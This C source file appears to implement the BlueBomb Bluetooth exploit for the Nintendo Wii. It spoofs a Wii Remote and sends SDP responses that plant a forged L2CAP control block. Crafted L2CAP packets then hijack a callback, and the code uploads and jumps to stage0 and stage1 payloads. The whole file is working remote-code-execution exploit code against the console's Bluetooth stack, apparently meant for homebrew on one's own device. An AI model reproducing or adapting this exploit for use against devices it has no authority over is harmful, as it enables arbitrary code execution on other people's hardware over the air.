#include "bluebomb_micro.h"
#include <stdio.h>
#include "btstack.h"

#include "stage0_bin.h"
#include "stage1_bin.h"

#ifndef L2CAP_EVENT_CONNECTION_RESPONSE
#error "You need to use this custom BTStack fork for this, Sorry :( https://github.com/GaryOderNichts/btstack"
#endif

struct ccb {
    uint8_t in_use;
    uint32_t chnl_state;
    uint32_t p_next_ccb;
    uint32_t p_prev_ccb;
    uint32_t p_lcb;
    uint16_t local_cid;
    uint16_t remote_cid;
    // We only go up to the fields we care about, you should still leave the rest blank as there are some fields that should be just left zero after it like the timer object.
};

struct l2cap_payload {
	uint8_t opcode;
	uint8_t id;
	uint16_t length;
	uint8_t data[];
} __attribute__ ((packed));
#define L2CAP_PAYLOAD_LENGTH 4

struct l2cap_packet {
	uint16_t length;
	uint16_t cid;
	struct l2cap_payload payload;
} __attribute__ ((packed));
#define L2CAP_HEADER_LENGTH 4
#define L2CAP_OVERHEAD 8

#define SDP_RESPONSE_BUFFER_SIZE (HCI_ACL_PAYLOAD_SIZE-L2CAP_HEADER_SIZE)

/**
 * The default command format always writes 2 IACs, but we only want one
 * @param num_current_iac must be 1
 * @param iac_lap
 */
static const hci_cmd_t hci_write_current_iac_lap_one_iac = {
    HCI_OPCODE_HCI_WRITE_CURRENT_IAC_LAP_TWO_IACS, "13"
};

static btstack_packet_callback_registration_t hci_event_callback_registration;

int stage = STAGE_INIT;

static uint16_t sdp_server_l2cap_cid;
static uint16_t sdp_server_response_size;
static uint8_t sdp_response_buffer[SDP_RESPONSE_BUFFER_SIZE];

static uint32_t L2CB = 0;

static hci_con_handle_t con_handle = (hci_con_handle_t) -1;

static btstack_timer_source_t stage0_timer;
static int stage0_sent = 0;

static int stage1_sent = 0;

static inline uint32_t htobe32(uint32_t x)
{
    if (btstack_is_big_endian()) {
        return x;
    }

    return ((((x) & 0xff000000) >> 24) | (((x) & 0x00ff0000) >>  8) |
        (((x) & 0x0000ff00) <<  8) | (((x) & 0x000000ff) << 24));
}

static inline uint16_t htobe16(uint16_t x)
{
    if (btstack_is_big_endian()) {
        return x;
    }

    return btstack_flip_16(x);
}

static inline uint32_t htole32(uint32_t x)
{
    if (btstack_is_little_endian()) {
        return x;
    }

    return ((((x) & 0xff000000) >> 24) | (((x) & 0x00ff0000) >>  8) |
        (((x) & 0x0000ff00) <<  8) | (((x) & 0x000000ff) << 24));
}

static inline uint16_t htole16(uint16_t x)
{
    if (btstack_is_little_endian()) {
        return x;
    }

    return btstack_flip_16(x);
}

static inline uint16_t le16toh(uint16_t x)
{
    if (btstack_is_little_endian()) {
        return x;
    }

    return btstack_flip_16(x);
}

static void hci_packet_handler(uint8_t packet_type, uint16_t channel, uint8_t* packet, uint16_t size)
{
    UNUSED(channel);
    UNUSED(size);

    static int set_iac_lap = 0;

    // We only care about HCI packets
    if (packet_type != HCI_EVENT_PACKET) {
        return;
    }

    // printf("hci_packet_handler %x\n", hci_event_packet_get_type(packet));

    switch(hci_event_packet_get_type(packet)) {
        case BTSTACK_EVENT_STATE:
            // Wait for the stack to enter the initializing state, before setting the IAC LAP
            if (btstack_event_state_get_state(packet) == HCI_STATE_WORKING) {
                set_iac_lap = 1;
            }
            break;
        case HCI_EVENT_COMMAND_COMPLETE:
            // Check IAC LAP result
            if (hci_event_command_complete_get_command_opcode(packet) == hci_write_current_iac_lap_one_iac.opcode) {
                uint8_t status = hci_event_command_complete_get_return_parameters(packet)[0];
                printf("Set IAC LAP: %s\n", (status != ERROR_CODE_SUCCESS) ? "Failed" : "OK");
            }
            break;
        case HCI_EVENT_CONNECTION_COMPLETE:
            con_handle = little_endian_read_16(packet, 3);
            printf("Got connection handle %d\n", con_handle);
            break;
        default:
            break;
    }

    // Write IAC LAP when ready
    if (set_iac_lap && hci_can_send_command_packet_now()) {
        set_iac_lap = 0;
        // Limited Inquiry Access Code
        hci_send_cmd(&hci_write_current_iac_lap_one_iac, 1, GAP_IAC_LIMITED_INQUIRY);

        // Set device discoverable now, to emit a write scan enable after IAC LAP is set
        gap_discoverable_control(1);
    }
}

static void bluebomb_reset(void)
{
    printf("Resetting...\n");

    if (sdp_server_l2cap_cid) {
        l2cap_disconnect(sdp_server_l2cap_cid);
        sdp_server_l2cap_cid = 0;
    }

    con_handle = (hci_con_handle_t) -1;

    stage0_sent = 0;
    stage1_sent = 0;
    stage = STAGE_INIT;
}

static uint8_t send_acl_packet(hci_con_handle_t handle, void* packet, uint32_t size)
{
    if (!hci_can_send_acl_packet_now(handle)){
        printf("send_acl_packet cannot send\n");
        return BTSTACK_ACL_BUFFERS_FULL;
    }

    hci_reserve_packet_buffer();

    // Copy packet to packet buffer
    uint8_t* acl_buffer = hci_get_outgoing_packet_buffer();

    // 0 - Connection handle : PB_CB: 0
    little_endian_store_16(acl_buffer, 0u, handle | (0 << 12u));
    // 2 - ACL length
    little_endian_store_16(acl_buffer, 2u,  size + 4u);
    // 4 - payload
    memcpy(acl_buffer + 4, packet, size);

    // Send packet
    return hci_send_acl_packet_buffer(size + 4u);
}

static int sdp_create_error_response(uint16_t transaction_id, uint16_t error_code)
{
    sdp_response_buffer[0] = SDP_ErrorResponse;
    big_endian_store_16(sdp_response_buffer, 1, transaction_id);
    big_endian_store_16(sdp_response_buffer, 3, 2);
    big_endian_store_16(sdp_response_buffer, 5, error_code);
    return 7;
}

static int sdp_handle_bluebomb_service_search_request(uint16_t remote_mtu)
{
    printf("Preparing service search response\n");

	uint16_t required_size = 1 + 2 + 2 + 2 + 2 + (0x15 * 4) + 1;
	uint32_t SDP_CB = L2CB + 0xc00;

    if (required_size > remote_mtu) {
        printf("required_size %d > remote_mtu %d\n", required_size, remote_mtu);
        bluebomb_reset();
        return 0;
    }

    memset(&sdp_response_buffer[0], 0x00, required_size);

	struct ccb fake_ccb;
	memset(&fake_ccb, 0x00, sizeof(struct ccb));
	fake_ccb.in_use = 1;
	fake_ccb.chnl_state = htobe32(0x00000002); // CST_TERM_W4_SEC_COMP
	fake_ccb.p_next_ccb = htobe32(SDP_CB + 0x68);
	fake_ccb.p_prev_ccb = htobe32(L2CB + 8 + 0x54 - 8);
	fake_ccb.p_lcb = htobe32(L2CB + 0x8);
	fake_ccb.local_cid = htobe16(0x0000);
	fake_ccb.remote_cid = htobe16(0x0000); // Needs to match the rcid sent in the packet that uses the faked ccb.

    sdp_response_buffer[0] = SDP_ServiceSearchResponse;
    big_endian_store_16(sdp_response_buffer, 1, 0x0001); // Transaction ID (ignored, no need to keep track of)
    big_endian_store_16(sdp_response_buffer, 3, 0x0059); // ParameterLength
    big_endian_store_16(sdp_response_buffer, 5, 0x0015); // TotalServiceRecordCount
    big_endian_store_16(sdp_response_buffer, 7, 0x0015); // CurrentServiceRecordCount

    uint16_t pos = 9; // ServiceRecordHandleList at 9
    memcpy(&sdp_response_buffer[0] + pos + (0xa * 4), &fake_ccb, sizeof(struct ccb)); pos += (0x15 * 4);
    sdp_response_buffer[pos++] = 0; // ContinuationState

    stage = STAGE_SERVICE_RESPONSE;

    return pos;
}

static int sdp_handle_bluebomb_service_attribute_request(uint16_t remote_mtu)
{
    printf("Preparing attribute response (%d/%d)\n", stage0_sent, stage0_bin_len);

    uint16_t required_size = 1 + 2 + 2 + 2 + 1 + 1 + 1 + 2 + 1 + 1;
    if (required_size + 0x10 > remote_mtu) {
        printf("required_size %d > remote_mtu %d\n", required_size + 0x10, remote_mtu);
        bluebomb_reset();
        return 0;
    }

    uint16_t sdp_mtu = remote_mtu - required_size;
    required_size += sdp_mtu;

    memset(&sdp_response_buffer[0], 0x00, required_size);

    sdp_response_buffer[0] = SDP_ServiceAttributeResponse;
    big_endian_store_16(sdp_response_buffer, 1, 0x0001); // Transaction ID (ignored, no need to keep track of)

    uint16_t pos;
    if (stage0_sent == 0) {
        big_endian_store_16(sdp_response_buffer, 3, 2 + 1 + 1 + 1 + 2 + 1 + sdp_mtu + 1);  // ParameterLength
        big_endian_store_16(sdp_response_buffer, 5, 1 + 1 + 1 + 2 + 1 + sdp_mtu); // AttributeListByteCount
        sdp_response_buffer[7] = 0x35; // DATA_ELE_SEQ_DESC_TYPE and SIZE_1
        sdp_response_buffer[8] = 0x02; // size of data elements
        sdp_response_buffer[9] = 0x09; // UINT_DESC_TYPE and SIZE_2
        big_endian_store_16(sdp_response_buffer, 10, 0xbeef); // The dummy int
        sdp_response_buffer[12] = 0x00; // padding so instruction is 0x4 aligned
        pos = 13;
    } else {
        big_endian_store_16(sdp_response_buffer, 3, 2 + sdp_mtu + 1);  // ParameterLength
        big_endian_store_16(sdp_response_buffer, 5, sdp_mtu); // AttributeListByteCount
        pos = 7;
    }

    uint32_t remaining = stage0_bin_len - stage0_sent;
    uint32_t to_send = btstack_min(remaining, sdp_mtu);
    memcpy(&sdp_response_buffer[0] + pos, &stage0_bin[0] + stage0_sent, to_send);
    pos += to_send;
    stage0_sent += to_send;

    sdp_response_buffer[pos++] = remaining <= sdp_mtu ? 0x00 : 0x01; // ContinuationState

    stage = STAGE_ATTRIB_RESPONSE;
    if (remaining <= sdp_mtu) {
        printf("Uploaded stage0\n");
        stage = STAGE_ATTRIB_RESPONSE_DONE;
    }

    return pos;
}

static void do_hax(void)
{
	// Chain these packets together so things are more deterministic.
	int bad_packet_len = L2CAP_PAYLOAD_LENGTH + 6;
	int empty_packet_len = L2CAP_PAYLOAD_LENGTH;
	int total_length = L2CAP_HEADER_LENGTH + bad_packet_len + empty_packet_len;

	printf("Sending hax\n");

    uint16_t remote_mtu = l2cap_get_remote_mtu_for_local_cid(sdp_server_l2cap_cid);
    if (total_length > remote_mtu) {
        printf("required_size %d > remote_mtu %d\n", total_length, remote_mtu);
        bluebomb_reset();
        return;
    }

    memset(&sdp_response_buffer[0], 0x00, total_length);

	struct l2cap_packet* hax = (struct l2cap_packet*) &sdp_response_buffer[0];
	struct l2cap_payload *p = &hax->payload;

	hax->length = htole16(bad_packet_len + empty_packet_len);
	hax->cid = htole16(0x0001);
	
	printf("Overwriting callback in switch case 0x9.\n");
	
	p->opcode = 0x01; // L2CAP_CMD_REJECT
	p->id = 0x00;
	p->length = htole16(0x0006);
	uint8_t *d = &p->data[0];
	
	little_endian_store_16(d, 0, 0x0002); // L2CAP_CMD_REJ_INVALID_CID
	little_endian_store_16(d, 2, 0x0000); // rcid (from faked ccb)
	little_endian_store_16(d, 4, 0x0040 + 0x1f); // lcid
	
	p = (struct l2cap_payload*)((uint8_t*)p + L2CAP_PAYLOAD_LENGTH + le16toh(p->length));
	
	printf("Trigger switch statement 0x9.\n");
	
	p->opcode = 0x09; // L2CAP_CMD_ECHO_RSP which will trigger a callback to our payload
	p->id = 0x00;
	p->length = htole16(0x0000);

	p = (struct l2cap_payload*)((uint8_t*)p + L2CAP_PAYLOAD_LENGTH + le16toh(p->length));

	if (send_acl_packet(con_handle, hax, total_length) != 0) {
        printf("Failed to send acl packet\n");
        bluebomb_reset();
    }
}

static void upload_payload(void)
{
    uint16_t remote_mtu = l2cap_get_remote_mtu_for_local_cid(sdp_server_l2cap_cid);
    if (L2CAP_PAYLOAD_LENGTH + L2CAP_HEADER_LENGTH + 0x10 > remote_mtu) {
        printf("required_size %d > remote_mtu %d\n", L2CAP_PAYLOAD_LENGTH + L2CAP_HEADER_LENGTH + 0x10, remote_mtu);
        bluebomb_reset();
        return;
    }

    uint16_t payload_mtu = remote_mtu - L2CAP_PAYLOAD_LENGTH - L2CAP_HEADER_LENGTH;

    uint32_t remaining = stage1_bin_len - stage1_sent;
    uint32_t to_send = btstack_min(remaining, payload_mtu);

	int upload_packet_len = L2CAP_PAYLOAD_LENGTH + to_send;
	int total_length = L2CAP_HEADER_LENGTH + upload_packet_len;

    memset(&sdp_response_buffer[0], 0x00, total_length);

	struct l2cap_packet* upload = (struct l2cap_packet*) &sdp_response_buffer[0];
	struct l2cap_payload *p = &upload->payload;

    upload->length = htole16(upload_packet_len);
    upload->cid = htole16(0x0001);
    
    p->opcode = 0x09; // L2CAP_CMD_UPLOAD_PAYLOAD
    p->id = 0x00; // CONTINUE_REQUEST
    p->length = htole16(to_send);
    
    memcpy(&p->data[0], &stage1_bin[0] + stage1_sent, to_send);

    printf("\r%d / %d", stage1_sent, stage1_bin_len);

    if (send_acl_packet(con_handle, upload, total_length) != 0) {
        printf("Failed to send acl packet\n");
        bluebomb_reset();
        return;
    }

    stage1_sent += to_send;

    if (remaining <= payload_mtu) {
        printf("\r%d / %d\n", stage1_sent, stage1_bin_len);
        printf("Uploaded stage1\n");
        stage = STAGE_JUMP_PAYLOAD;
    }
}

static void jump_paylaod(void)
{
    printf("Sending jump\n");

    uint16_t remote_mtu = l2cap_get_remote_mtu_for_local_cid(sdp_server_l2cap_cid);
    int jump_packet_len = L2CAP_PAYLOAD_LENGTH;
    int total_length = L2CAP_HEADER_LENGTH + jump_packet_len;

    if (total_length > remote_mtu) {
        printf("total_length %d > remote_mtu %d\n", total_length, remote_mtu);
        bluebomb_reset();
        return;
    }

    memset(&sdp_response_buffer[0], 0x00, total_length);

	struct l2cap_packet* jump = (struct l2cap_packet*) &sdp_response_buffer[0];
	struct l2cap_payload *p = &jump->payload;

    jump->length = htole16(jump_packet_len);
    jump->cid = htole16(0x0001);

    p->opcode = 0x09; // L2CAP_CMD_UPLOAD_PAYLOAD
    p->id = 0x01; // JUMP_PAYLOAD
    p->length = htole16(0x0000);

    if (send_acl_packet(con_handle, jump, total_length) != 0) {
        printf("Failed to send jump packet\n");
        bluebomb_reset();
    }

    // we're done now
    printf("All done!\n");
    bluebomb_reset();
}

static void sdp_respond(void)
{
    switch (stage) {
        case STAGE_HAX:
            do_hax();
            break;
        case STAGE_UPLOAD_PAYLOAD:
            upload_payload();
            break;
        case STAGE_JUMP_PAYLOAD:
            jump_paylaod();
            break;
        default: {
            if (!sdp_server_response_size || !sdp_server_l2cap_cid) {
                return;
            }
            
            // update state before sending packet (avoid getting called when new l2cap credit gets emitted)
            uint16_t size = sdp_server_response_size;
            sdp_server_response_size = 0;
            l2cap_send(sdp_server_l2cap_cid, sdp_response_buffer, size);

            if (stage == STAGE_ATTRIB_RESPONSE_DONE) {
                printf("Sleeping for 5 seconds to try to make sure stage0 is flushed\n");

                // Set up 5s timer for hax
                btstack_run_loop_set_timer(&stage0_timer, 5000);
                btstack_run_loop_add_timer(&stage0_timer);

                stage = STAGE_HAX_WAITING;
            }
            break;
        }
    }

}

static void bluebomb_sdp_packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size)
{
    // printf("sdp_packet_handler %x\n", packet_type);

    switch (packet_type) {
        case L2CAP_DATA_PACKET: {
            sdp_pdu_id_t pdu_id = (sdp_pdu_id_t) packet[0];
            uint16_t transaction_id = big_endian_read_16(packet, 1);
            uint16_t param_len = big_endian_read_16(packet, 3);
            uint16_t remote_mtu = l2cap_get_remote_mtu_for_local_cid(channel);

            // Account for buffer size
            remote_mtu = btstack_min(remote_mtu, SDP_RESPONSE_BUFFER_SIZE);

            // Make sure param_len doesn't exceed size
            if ((param_len + 5) > size) {
                pdu_id = SDP_ErrorResponse;
            }

            printf("SDP Request: type %u, transaction id %u, len %u, mtu %u\n", pdu_id, transaction_id, param_len, remote_mtu);

            // meh give up on packets if we reached this stage
            if (stage > STAGE_ATTRIB_RESPONSE_DONE) {
                return;
            }

            switch (pdu_id) {
                case SDP_ServiceSearchRequest:
                    sdp_server_response_size = sdp_handle_bluebomb_service_search_request(remote_mtu);
                    break;               
                case SDP_ServiceAttributeRequest:
                    sdp_server_response_size = sdp_handle_bluebomb_service_attribute_request(remote_mtu);
                    break;
                default:
                    sdp_server_response_size = sdp_create_error_response(transaction_id, 0x0003);
                    break;
            }

            if (!sdp_server_response_size) {
                break;
            }

            l2cap_request_can_send_now_event(sdp_server_l2cap_cid);
            break;
        }

        case HCI_EVENT_PACKET:
            switch (hci_event_packet_get_type(packet)) {
                case L2CAP_EVENT_INCOMING_CONNECTION:
                    if (sdp_server_l2cap_cid) {
                        // Just reject other incoming connections
                        l2cap_decline_connection(channel);
                        break;
                    }

                    // Accept connection
                    sdp_server_l2cap_cid = channel;
                    sdp_server_response_size = 0;
                    l2cap_accept_connection(sdp_server_l2cap_cid);
                    break;
                case L2CAP_EVENT_CHANNEL_OPENED:
                    // Reset if open failed
                    if (packet[2]) {
                        bluebomb_reset();
                    }
                    break;
                case L2CAP_EVENT_CAN_SEND_NOW:
                    sdp_respond();
                    break;
                case L2CAP_EVENT_CHANNEL_CLOSED:
                    // Reset if channel closed
                    if (channel == sdp_server_l2cap_cid) {
                        bluebomb_reset();
                    }
                    break;
                case L2CAP_EVENT_CONNECTION_RESPONSE: {
                    uint16_t result = little_endian_read_16(packet, 1);
                    // printf("Got connection response result %x\n", result);
                    if (result == 0x5330) { // 'S0'
                        printf("Received 'S0' response\n");
                        stage = STAGE_UPLOAD_PAYLOAD;

                        l2cap_request_can_send_now_event(sdp_server_l2cap_cid);
                    } else if (result == 0x4744) { // Payload upload response
                        l2cap_request_can_send_now_event(sdp_server_l2cap_cid);
                    }
                    break;
                }
                default:
                    break;
            }
            break;
        default:
            break;
    }
}

static void stage0_done_handler(struct btstack_timer_source *ts)
{
    printf("Stage0 flushed, moving on\n");

    stage = STAGE_HAX;

    // Request send
    l2cap_request_can_send_now_event(sdp_server_l2cap_cid);
}

static void setup_bt(void)
{
    // Disable SSP
    gap_ssp_set_enable(0);

    // Set device connectable
    gap_connectable_control(1);

    // Set device non discoverable for now, we'll set this after setting IAC LAP
    gap_discoverable_control(0);

    // Set device bondable
    gap_set_bondable_mode(1);

    // Set local name
    gap_set_local_name("Nintendo RVL-CNT-01");

    // Set class
    gap_set_class_of_device(0x002504);

    // Register HCI callback to set IAC LAP once HCI is working
    // and to catch the connection handle
    hci_event_callback_registration.callback = &hci_packet_handler;
    hci_add_event_handler(&hci_event_callback_registration);

    // init L2CAP
    l2cap_init();

    // Register SDP service with max possible MTU
    l2cap_register_service(bluebomb_sdp_packet_handler, BLUETOOTH_PSM_SDP, 0xffff, LEVEL_0);

    // setup timer
    stage0_timer.process = stage0_done_handler;

    // Power on!
    hci_power_control(HCI_POWER_ON);
}

int bluebomb_setup(uint32_t l2cb)
{
    L2CB = l2cb;

	uint32_t payload_addr = 0x81780000; // 512K before the end of mem 1

	if (L2CB >= 0x81000000) {
		printf("Detected system menu\n");
		payload_addr = 0x80004000;
	}

	printf("App settings:\n");
	printf("\tL2CB: 0x%08lX\n", L2CB);
	printf("\tpayload_addr: 0x%08lX\n", payload_addr);
	
    big_endian_store_32(&stage0_bin[0], 0x8, payload_addr);

    // Setup bluetooth
    setup_bt();

    return 0;
}

int bluebomb_get_stage(void)
{
    return stage;
}
